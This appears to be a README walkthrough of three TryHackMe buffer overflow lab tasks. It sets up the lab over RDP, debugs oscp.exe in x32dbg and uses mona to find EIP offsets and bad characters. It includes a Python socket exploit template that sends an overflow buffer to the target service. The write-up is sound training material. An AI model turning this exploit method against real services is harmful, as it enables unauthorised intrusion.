# Introduction
We'll be solving 3 tryhackme's stack buffer overflows from 0.

First of all, the web mentioned: https://tryhackme.com/room/bufferoverflowprep

We'll just take three of ten tasks.

On your Windows virtual machine, download the OpenVPN app and your config file and connect to the TryHackMe lab.
We're using Windows for the next debugger: https://github.com/therealdreg/x64dbg-exploiting



## Preparation
Now, download wfreerdp from: https://ci.freerdp.com/job/freerdp-nightly-windows/arch=win32,label=vs2013/

[![7eaca6a835462d61e6e728ee31e68002.png](https://i.postimg.cc/FzGDXYrC/7eaca6a835462d61e6e728ee31e68002.png)](https://postimg.cc/ZvBrrKy6)

Use this to get the files we need from the tryhackme's lab:

1- Open a cmd.

2- Go to the wfreerdp.exe location.

3- Execute the next command, and wait it to prompt: ```wfreerdp.exe /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea```

[![f5c01f04067b7dfd594707974a929134.png](https://i.postimg.cc/2SXj8G9r/f5c01f04067b7dfd594707974a929134.png)](https://postimg.cc/mPCWmYG5)

We're in!

Now compress the folder named: ```vulnerable-apps```, it should look like this: ```vulnerable-apps.zip```

Open a cmd, go to Desktop and open a python server: ```c:\Python27\python.exe -m SimpleHTTPServer```

[![735d39e14aff853c4697b71bf50489c1.png](https://i.postimg.cc/bw60YXjr/735d39e14aff853c4697b71bf50489c1.png)](https://postimg.cc/PCwvKRJn)

In our Windows host, go to ```http://MACHINE_IP:8000/vulnerable-apps.zip``` and that's it, we have everything we need.

# Using x32dbg

Open x32dbg.exe and open the ```oscp.exe``` included in the ```vulnerable-apps``` folder.

[![fe4c3e7b918b16a6f0426d7cf74babd2.png](https://i.postimg.cc/8zmDnrYQ/fe4c3e7b918b16a6f0426d7cf74babd2.png)](https://postimg.cc/Yv0Jvjkb)

Once opened, make some clicks until we ensure the program is running succesfully.

It should be like this:

[![bc23c133126932d97e13e5224d94db87.png](https://i.postimg.cc/PJQ2kTnx/bc23c133126932d97e13e5224d94db87.png)](https://postimg.cc/ct6QRqHy)

Open your notepad (classic Windows NotePad or NotePad ++, it doesn't matter) and copy this script to exploit the ```oscp.exe```:

```
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

We're ready to exploit.



# Exploiting OVERFLOW1

With our copied script, rename it as ```exploit.py``` 

We need to import mona and its config with the next command line:

```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
```

NOTE: We need to use this command line everytime we reboot our Windows!

First of all we're going to fill the stack with a cyclic pattern to see where the EIP is.

Before this, go to ```log``` and at the command line paste: ```mona.mona("pattern_create 2000")```

It will create a cyclic pattern of 2000, open your ```exploit.py``` and paste it at the ```payload``` line.

[![a8ecdbefeaba0a391173003b2ddd8413.png](https://i.postimg.cc/153nyspq/a8ecdbefeaba0a391173003b2ddd8413.png)](https://postimg.cc/xqBTRrpf)

[![29de62a2769cf27ea4601fae99796222.png](https://i.postimg.cc/C1v07Td3/29de62a2769cf27ea4601fae99796222.png)](https://postimg.cc/Vrb2shqg)

Save your script and run it with python3: ```python3 exploit.py``` Give it many tries until x32dbg receive the response.

NOTE: Sometimes programs might crash if we use a big pattern, give it some tries if it happens with lower patterns.

Once it receives our exploit, see where EIP is, mine is: ```6F43396E```

[![eba3a8e41c04dccfab085ba93fd2a3aa.png](https://i.postimg.cc/zf83PNXv/eba3a8e41c04dccfab085ba93fd2a3aa.png)](https://postimg.cc/68b9yDZx)

Then make a search of the pattern indicating EIP: ```mona.mona("pattern_offset EIP")```

Great! We have 1978 A's until EIP. Now fill the EIP with 4 B's (insert them at the ```retn``` line)

[![99559cf5d7b79579757cffd6e3acfef8.png](https://i.postimg.cc/65pkcmXK/99559cf5d7b79579757cffd6e3acfef8.png)](https://postimg.cc/BtR7QNb7)

Save your script and restart your x32dbg.

NOTE: Everytime you modify and run the program you must restart!

[![fd93562e56d146d6650aa3da1887ef18.png](https://i.postimg.cc/NMP6cF5p/fd93562e56d146d6650aa3da1887ef18.png)](https://postimg.cc/62n2V9Vv)

EIP has the B's in it! And we are right at the top of the stack (```ESP```)

[![8c085382a900fc64f7b2af19c23e0001.png](https://i.postimg.cc/qRf6rFr6/8c085382a900fc64f7b2af19c23e0001.png)](https://postimg.cc/yJP8Xvk7)

## Looking for badchars at OVERFLOW1

Now it's time to exclude some bad characters(hex characters that alterate our desired shellcode to exploit).

We'll be using the next command line:

```mona.mona('bytearray -cpb "\\x00"')``` This one give us an hex pattern without the "null-byte" \x00.

```mona.mona('compare -f C:\\logs\\oscp\\bytearray.bin -a ESP')``` And this one to compare our logs with the created pattern.

Use the first and copy the results at your script like this:

[![b97ecfc098d6a6647cca2f5f6755bb62.png](https://i.postimg.cc/90Hc5cPs/b97ecfc098d6a6647cca2f5f6755bb62.png)](https://postimg.cc/cghpfybc)

[![13785e22bb3eab5b7a832e9eca20ceee.png](https://i.postimg.cc/wTVRVrg9/13785e22bb3eab5b7a832e9eca20ceee.png)](https://postimg.cc/PPCqf2C7)

Save and execute your exploit with your x32dbg restarted. Now when the payload it's received use the second command and it should give us some possibly bad characters.

Repeat the process above for every bad character. Always use the first that the program give us when compare. For example, next one is ```\x07```

NOTE: Just one by one!

```mona.mona('bytearray -cpb "\\x00\\x07"')```

![ddafb90066922d2743106b78e3e7156b](https://user-images.githubusercontent.com/107146199/172814193-4499e47d-788c-42f8-9832-77f21af8de68.png)

Once you do the last compare it shows the next message.

[![33e19cfeb5169cf16571ddbd322b16a3.png](https://i.postimg.cc/D0XCbbNY/33e19cfeb5169cf16571ddbd322b16a3.png)](https://postimg.cc/BPJ5rt4x)

Our badchars are: ```\x00\x07\x2e\xa0``` TASK COMPLETED!



# Exploiting OVERFLOW2

Using the last script, change the ```prefix``` line with ```"OVERFLOW2 "``` 

Create a cyclic pattern of 1500 ```mona.mona("pattern_create 1500")``` and paste it to the ```payload``` line.

Wait x32dbg to receive the payload and do a search of EIP ```mona.mona("pattern_offset EIP")```

634 A's are needed until EIP, then refill EIP with 4 B's. We should be at the top of the stack of this task.

![7098e16d4a06233162bca97c1fbcc8bf](https://user-images.githubusercontent.com/107146199/172823063-fa80e459-0126-45dd-aaaa-d628f2a7cb28.png)

We're here!

![7fa436086609254e6b183100a671d6ff](https://user-images.githubusercontent.com/107146199/172824425-14ae5fe4-c207-463a-b523-20d0a3a68c8a.png)

## Looking for badchars at OVERFLOW2

Do the same steps as we did at OVERFLOW1, first of all exclude the "null-byte" ```\x00```: ```mona.mona('bytearray -cpb "\\x00"')```

Copy the results to your script ```payload``` line, save it and execute your script with x32dbg restarted.

Now do a compare: ```mona.mona('compare -f C:\\logs\\oscp\\bytearray.bin -a ESP')``` It gives us another badchar: ```\x23```

Repeat the process with every badchar and at the end it'll give us an "Hooray" message. At this point we have every badchar we need to exclude.

![2f256c93b6ed40cc7d46d977b2ff8039](https://user-images.githubusercontent.com/107146199/172834141-8f9d7b58-442e-4547-8491-9eb889a2f8c3.png)

Our badchars are: ```\x00\x23\x3c\x83\xba``` TASK COMPLETED!



# Exploiting OVERFLOW3

Modify again our script, change ```prefix``` to ```"OVERFLOW3 "```

Create again a cyclic pattern of 1300 ```mona.mona("pattern_create 1500")``` and paste it to the ```payload``` line.

Wait x32dbg to receive the payload and do a search of EIP ```mona.mona("pattern_offset EIP")```

![cd513496b5ef88316d68a1c64fa8fcc0](https://user-images.githubusercontent.com/107146199/172836704-400d5b5d-741e-4937-a445-008f96f3dc1c.png)

1274 A's we need to get to EIP, then refill again with 4 B's. We're at the top of the stack!

![2fe08216b0f6a7b7c44fc871e1ad3fa9](https://user-images.githubusercontent.com/107146199/172840568-a5c229ea-b366-4e57-964e-dfb34b8a2cbd.png)

It's time for bad characters!

## Looking for badchars at OVERFLOW3

Do the same steps as we did at OVERFLOW2, first of all exclude the "null-byte" ```\x00```: ```mona.mona('bytearray -cpb "\\x00"')```

Copy the results to your script ```payload``` line, save it and execute your script with x32dbg restarted.

Now do a compare: ```mona.mona('compare -f C:\\logs\\oscp\\bytearray.bin -a ESP')``` It gives us another badchar: ```\x11``` and last badchar is: ```\xee```

Repeat the process for every badchar until it give us an "Hooray" message. At this point we have every badchar we need to exclude.

![ea5a6cb4fe29205d808dd9148a08ea82](https://user-images.githubusercontent.com/107146199/172842998-0ca21b9f-a9d7-413a-863f-945703da7de0.png)

Our last payload for badchars should be like the next one:

![6c12594c7412a7a4f630fc6583a186f1](https://user-images.githubusercontent.com/107146199/172842369-c59fc978-97a4-4f69-a523-56718df901cb.png)

Our badchars are: ```\x00\x11\x40\x5F\xb8\xee``` TASK COMPLETED!!

If you're here, congrats, you're able to solve last tasks of this tryhackme lab!

# Credits 

https://github.com/therealdreg

https://github.com/x64dbg
